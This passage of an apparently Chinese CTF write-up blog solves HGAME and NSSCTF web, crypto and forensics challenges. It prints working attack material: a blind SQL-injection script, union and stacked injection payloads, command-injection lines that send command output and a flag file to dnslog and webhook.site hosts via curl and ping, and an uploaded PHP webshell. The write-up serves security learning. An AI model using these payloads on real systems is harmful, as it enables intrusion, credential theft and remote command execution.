3</h2><h3 id="login-to-get-my-gift"><a class="markdownIt-Anchor" href="#login-to-get-my-gift"></a> Login To Get My Gift</h3><p>测试一下，只显示<code>Success</code>,<code>Fail</code>,<code>SQL Injection Detected</code>,应该是盲注</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://week-3.hgame.lwsec.cn:31480/login&#x27;</span><br>cookie = &#123;<span class="hljs-string">&#x27;_ga_P1E9Z5LRRK&#x27;</span>: <span class="hljs-string">&#x27;GS1.1.1673534407.1.1.1673534578.0.0.0&#x27;</span>, <span class="hljs-string">&#x27;_ga&#x27;</span>: <span class="hljs-string">&#x27;GA1.1.690589002.1673534407&#x27;</span>&#125;<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">128</span>):<br>        payload = <span class="hljs-string">&quot;0&#x27;/**/or/**/ascii(right(left((select/**/concat_ws(0x7e,PAssw0rD)/**/from/**/User1nf0mAt1on/**/limit/**/0,1),&#123;0&#125;),1))/**/regexp/**/&#123;1&#125;#&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>,j)<br>        <span class="hljs-built_in">print</span>(payload)<br>        data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: payload, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-number">1</span>&#125;<br>        rsp = requests.post(url=url, data=data, cookies=cookie)<br>        <span class="hljs-comment">#print(rsp.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Success!&#x27;</span> <span class="hljs-keyword">in</span> rsp.text:<br>            flag+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">0&#x27;/**/or/**/length((database()))&lt;8/**/#数据库长度7<br>0&#x27;/**/or/**/ascii(right(left(database(),&#123;0&#125;),1))/**/regexp/**/&#123;1&#125;/**/#.format(i,j)数据库名L0g1NMe<br>0&#x27;/**/or/**/length(((select/**/concat_ws(0x7e,table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/regexp/**/database()/**/limit/**/0,1)))&gt;1/**/#只有一个表<br>0&#x27;/**/or/**/length(((select/**/concat_ws(0x7e,table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/regexp/**/database()/**/limit/**/0,1)))&lt;15/**/#表名长度为14<br>0&#x27;/**/or/**/ascii(right(left((select/**/concat_ws(0x7e,table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/regexp/**/database()/**/limit/**/0,1),&#123;0&#125;),1))/**/regexp/**/&#123;1&#125;#&quot;.format(i+1,j)表名User1nf0mAt1on<br>0&#x27;/**/or/**/length(((select/**/concat_ws(0x7e,column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/&#x27;User1nf0mAt1on&#x27;/**/limit/**/2,1)))&gt;1/**/#列数 3列<br><br>0&#x27;/**/or/**/ascii(right(left((select/**/concat_ws(0x7e,column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/&#x27;User1nf0mAt1on&#x27;/**/limit/**/0,1),1),1))/**/&gt;/**/100#<br>第一列长度2 id 第二列长度8 PAssw0rD第三列长度8UsErN4me<br><br>0&#x27;/**/or/**/ascii(right(left((select/**/concat_ws(0x7e,UsErN4me)/**/from/**/User1nf0mAt1on/**/limit/**/0,1),&#123;0&#125;),1))/**/regexp/**/&#123;1&#125;#&quot;.format(i+1,j)<br>1WeLc0meT0hgAmE2023hAPPySqlhgAmE2023HAppYnEwyEAr<br></code></pre></td></tr></table></figure><p>拿到管理员的用户名和密码，访问/home得到flag</p><p><code>hgame&#123;It_1s_1n7EresT1nG_T0_ExPL0Re_Var10us_Ways_To_Sql1njEct1on&#125;</code></p><h3 id="ping-to-the-host"><a class="markdownIt-Anchor" href="#ping-to-the-host"></a> Ping To The Host</h3><p>一看RCE,马上试一下127.0.0.1|ls ，结果无回显。。。。</p><p>试了几个无回显RCE，发现DNS带外和http带外可以用，不过还是有点小坑</p><p>payload1:DNS带外</p><p>在<a href="http://www.dnslog.cn/">DNSLog</a>注册一个临时的DNS</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>|ping$IFS$<span class="hljs-number">9</span>`whoami`.<span class="hljs-number">7</span>n17xh.dnslog.cn<br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>|ping$IFS$<span class="hljs-number">9</span>`head$IFS$<span class="hljs-number">9</span>/f*`.<span class="hljs-number">7</span>n17xh.dnslog.cn<br></code></pre></td></tr></table></figure><img src="/2023/01/05/HGAME/18.png" class=""><p>payload2:http带外</p><p>在<a href="https://webhook.site/">webhook</a>生成一个临时网站来接受请求查看回显</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>|curl$IFS$<span class="hljs-number">9</span>https://webhook.site/<span class="hljs-number">318355</span>c4-be7a-<span class="hljs-number">4</span>a93-<span class="hljs-number">8241</span>-<span class="hljs-number">53</span>a6028f7070/`whoami`<br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>|curl$IFS$<span class="hljs-number">9</span>https://webhook.site/<span class="hljs-number">318355</span>c4-be7a-<span class="hljs-number">4</span>a93-<span class="hljs-number">8241</span>-<span class="hljs-number">53</span>a6028f7070/`head$IFS$<span class="hljs-number">9</span>/f*`<br></code></pre></td></tr></table></figure><img src="/2023/01/05/HGAME/19.png" class=""><h3 id="gopher-shop"><a class="markdownIt-Anchor" href="#gopher-shop"></a> Gopher Shop</h3><p>这道是没有做出来的题，看了wp，学习一下</p><p>随便注册一个账户进去商店</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//校验是否买的起</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> || number &lt; <span class="hljs-number">1</span> || user.Balance &lt; <span class="hljs-type">uint</span>(number) * price&#123;<br>context.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;invalid request&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里是golang整数溢出漏洞，uint类型在64位机器上运⾏时为uint64，最⼤值为 18446744073709551615 ,最⼩值为 0 ，超出范围都会溢出。</p><p>要使<code>uint(number) * price</code>小于等于给定的10元，这样就可以买到超多的Apple,再把Apple买出去就可以用来买flag</p><p><code>1844674407370955162*10=18446744073709551620=4&lt;10</code>,因此可以购买1844674407370955162个Apple</p><img src="/2023/01/05/HGAME/20.png" class=""><p>慢慢地把Apple卖出去（数值不能溢出）</p><img src="/2023/01/05/HGAME/21.png" class=""><p>再Check Flag一下，<code>hgame&#123;GopherShop_M@gic_1nt_0verflow&#125;</code></p><h3 id="ezdh"><a class="markdownIt-Anchor" href="#ezdh"></a> ezDH</h3><p>这个密码题不知道可以用sage⾥的discrete_log函数来解离散对数问题</p><p>discrete_log 就是结合Pohlig-Hellman algorithm和⼤步⼩步法 (bsgs)</p><p>可以对数分离就变得简单了</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage <span class="hljs-keyword">import</span> *<br>N = <span class="hljs-number">0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001</span><br>g = GF(N)(<span class="hljs-number">2</span>)<br>A = <span class="hljs-number">0x22888b5ac1e2f490c55d0891f39aab63f74ea689aa3da3e8fd32c1cd774f7ca79538833e9348aebfc8eba16e850bbb94c35641c2e7e7e8cb76032ad068a83742dbc0a1ad3f3bef19f8ae6553f39d8771d43e5f2fcb986bd72459456d073e70d5be4d79ce5f10f76edea01492f11b807ebff0faf6819d62a8e972084e1ed5dd6e0152df2b0477a42246bbaa04389abf639833</span><br>B = <span class="hljs-number">0x1889c9c65147470fdb3ad3cf305dc3461d1553ee2ce645586cf018624fc7d8e566e04d416e684c0c379d5819734fd4a09d80add1b3310d76f42fcb1e2f5aac6bcdd285589b3c2620342deffb73464209130adbd3a444b253fc648b40f0acec7493adcb3be3ee3d71a00a2b121c65b06769aada82cd1432a6270e84f7350cd61dddc17fe14de54ab436f41b9c9a0430510dde</span><br>a=discrete_log(A,g)<br>b=discrete_log(B,g)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Alice secret:&#x27;</span>,a)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bod secret:&#x27;</span>,b)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">pow</span>(B,a,N)==<span class="hljs-built_in">pow</span>(A,b,N)<br>shared_secret=power_mod(B,a,N)<br>p=<span class="hljs-number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span><br>a=-<span class="hljs-number">3</span><br>b=<span class="hljs-number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span><br>E = EllipticCurve(GF(p), [a, b])<br><br>G=(<span class="hljs-number">6205877918333770287323403670543661734129170085954198767820861962261174202646976379181735257759867760655835711845144326470613882395445975482219869828210975915</span>, <span class="hljs-number">3475351956909044812130266914587199895248867449669290021764126870271692995160201860564302206748373950979891071705183465400186006709376501382325624851012261206</span>)<br>G=E(G)<br>Pa=(<span class="hljs-number">2131916734759224323822132103713450942372127857975491448998753734796387810139407713081623540463771547844600806401723562334185214530516095152824413924854874698</span>, <span class="hljs-number">1690322613136671350646569297044951327454506934124656653046321341087958059722809120500999091493097880695888777563486212179798037350151439310538948719271467773</span>) <br>Pa=E(Pa)<br>P1=(<span class="hljs-number">2032638959575737798553734238953177065671021112450002471824225734491735604600003028491729131445734432442510201955977472408728415227018746467250107080483073647</span>, <span class="hljs-number">3510147080793750133751646930018687527128938175786714269902604502700248948154299853980250781583789623838631244520649113071664767897964611902120411142027848868</span>)<br>P1=E(P1)<br>c=(<span class="hljs-number">6670373437344180404127983821482178149374116817544688094986412631575854021385459676854475335068369698875988135009698187255523501841013430892133371577987480522</span>, <span class="hljs-number">6648964426034677304189862902917458328845484047818707598329079806732346274848955747700716101983207165347315916182076928764076602008846695049181874187707051395</span>)<br>c=E(c)<br>m=c-shared_secret*P1<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(m.xy()[<span class="hljs-number">0</span>]))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>m=<span class="hljs-number">13292147408567104965230968399931206813163211945388416847625302108610603758415964822638521981</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#hgame&#123;Weak_p@ramet3r_make_DHKE_broken&#125;</span><br></code></pre></td></tr></table></figure><h3 id="tunnel"><a class="markdownIt-Anchor" href="#tunnel"></a> Tunnel</h3><p>用wireshark打开，搜索hagme就拿到flag<code>hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTFwp</title>
    <link href="/2023/01/04/NSSCTFwp/"/>
    <url>/2023/01/04/NSSCTFwp/</url>
    
    <content type="html"><![CDATA[<h3 id="swpuctf-2021-新生赛pseudoprotocols"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛pseudoprotocols"></a> [SWPUCTF 2021 新生赛]PseudoProtocols</h3><p>有关PHP伪协议简单记一下</p><p>上来给了一个提示</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">hint</span> <span class="hljs-keyword">is</span> hear Can you find out the <span class="hljs-keyword">hint</span>.php?<br></code></pre></td></tr></table></figure><p>再看地址栏有参数wllm</p><p>直接想到伪协议读文件</p><p><code>php://filter/read=convert.base64-encode/resource=hint.php</code></p><p>base64解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//go to /test2222222222222.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问/test2222222222222.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;max_execution_time&quot;</span>, <span class="hljs-string">&quot;180&quot;</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$a</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;r&#x27;</span>)) === <span class="hljs-string">&#x27;I want flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success\n&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码审计，直接php://input  再post 一个I want flag 搞定</p><img src="/2023/01/04/NSSCTFwp/1.png" class=""><h3 id="hubuctf-2022-新生赛checkin"><a class="markdownIt-Anchor" href="#hubuctf-2022-新生赛checkin"></a> [HUBUCTF 2022 新生赛]checkin</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$username</span>  = <span class="hljs-string">&quot;this_is_secret&quot;</span>; <br><span class="hljs-variable">$password</span>  = <span class="hljs-string">&quot;this_is_not_known_to_you&quot;</span>; <br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<span class="hljs-comment">//here I changed those two </span><br><span class="hljs-variable">$info</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;info&#x27;</span>])? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;info&#x27;</span>]: <span class="hljs-string">&quot;&quot;</span> ;<br><span class="hljs-variable">$data_unserialize</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$info</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$data_unserialize</span>[<span class="hljs-string">&#x27;username&#x27;</span>]==<span class="hljs-variable">$username</span>&amp;&amp;<span class="hljs-variable">$data_unserialize</span>[<span class="hljs-string">&#x27;password&#x27;</span>]==<span class="hljs-variable">$password</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;username or password error!&quot;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>username和password都会被修改成不知道的值，所以不可能给他们赋上真实的值</p><p>这里用<code>==</code>是弱比较</p><p>并且用了反序列化</p><p>因此，构造info如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$info</span>=<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-literal">true</span><br>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$info</span>));<br><span class="hljs-comment">#a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>因为上面用的是键名访问，所以这里要用数组</p><p>简单介绍弱类型比较</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span>);  <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;1admin&quot;</span>==<span class="hljs-number">1</span>); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">1</span>) <span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>==<span class="hljs-number">0</span>) <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;a&quot;</span>==<span class="hljs-literal">true</span>)  <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;a&quot;</span>==<span class="hljs-literal">false</span>)  <span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e4456789&quot;</span>); <span class="hljs-comment">//true </span><br><span class="hljs-meta">?&gt;</span>  <br><br></code></pre></td></tr></table></figure><p><code>NSSCTF&#123;881620fb-c01a-4eda-bbfa-baef4a333f9e&#125;</code></p><h3 id="swpuctf-2021-新生赛sql"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛sql"></a> [SWPUCTF 2021 新生赛]sql</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">过滤注释符，用%23替代<br>过滤空格，用/**/替代<br>?wllm=1&#x27;/**/order/**/by/**/3%23   #3列<br>?wllm=0&#x27;/**/union/**/select/**/1,2,database()%23   #test_db<br>过滤等号,用like替代<br>?wllm=0&#x27;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()%23 #LTLT_flag,users<br>?wllm=0&#x27;/**/union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&#x27;LTLT_flag&#x27;%23  #id,flag<br>?wllm=0&#x27;/**/union/**/select/**/1,2,group_concat(flag)/**/from/**/LTLT_flag%23   #NSSCTF&#123;b0c390d7-ca62<br>group_concat只回显20个字符，使用right,REVERSE,substr被过滤，使用mid替代<br>?wllm=0&#x27;/**/union/**/select/**/1,2,mid(group_concat(flag),21,20)/**/from/**/LTLT_flag%23 #-4071-9468-bb0808163<br>?wllm=0&#x27;/**/union/**/select/**/1,2,mid(group_concat(flag),41,20)/**/from/**/LTLT_flag%23  #493&#125;<br></code></pre></td></tr></table></figure><p><code>NSSCTF&#123;b0c390d7-ca62-4071-9468-bb0808163493&#125;</code></p><h3 id="强网杯-2019随便注"><a class="markdownIt-Anchor" href="#强网杯-2019随便注"></a> [强网杯 2019]随便注</h3><p>这道是mysql堆叠注入</p><p>payload如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;;show tables;&#x27;得到两个表：<span class="hljs-number">1919810931114514</span> words<br><span class="hljs-attribute">1</span>&#x27;;show columns from `<span class="hljs-number">1919810931114514</span>`;&#x27;得到字段名为flag<br><span class="hljs-attribute">1</span>&#x27;;handler `<span class="hljs-number">1919810931114514</span>` open;handler `<span class="hljs-number">1919810931114514</span>` read first;&#x27;读出flag:NSSCTF&#123;<span class="hljs-number">2</span>cc5ca69-<span class="hljs-number">9</span>cec-<span class="hljs-number">4</span>a31-<span class="hljs-number">8</span>cb4-ee8748c8b51f&#125;<br></code></pre></td></tr></table></figure><h3 id="nssround1-basicbasic_check"><a class="markdownIt-Anchor" href="#nssround1-basicbasic_check"></a> [NSSRound#1 Basic]basic_check</h3><p>看到时有关HTTP，查看请求头都没看到什么，扫描也没有什么提示</p><p>用curl命令扫一下</p><img src="/2023/01/04/NSSCTFwp/5.jpg" class=""><p>现有请求方法可以用PUT，直接写入木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2023/01/04/NSSCTFwp/6.png" class=""><p>访问1.php，传参</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span> /</span><br>?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cat</span> /flag</span><br><span class="hljs-comment">#NSSCTF&#123;01dfc03a-f0f6-419d-a992-32dd79ea301d&#125;</span><br></code></pre></td></tr></table></figure><h3 id="nisactf-2022babyupload"><a class="markdownIt-Anchor" href="#nisactf-2022babyupload"></a> [NISACTF 2022]babyupload</h3><p>看到文件上传</p><p>先看一下页面源码，是否有什么提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/upload&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    Select image to upload:<br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Upload File&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-comment">&lt;!-- /source --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>不错，访问 /source下载到一个python文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span 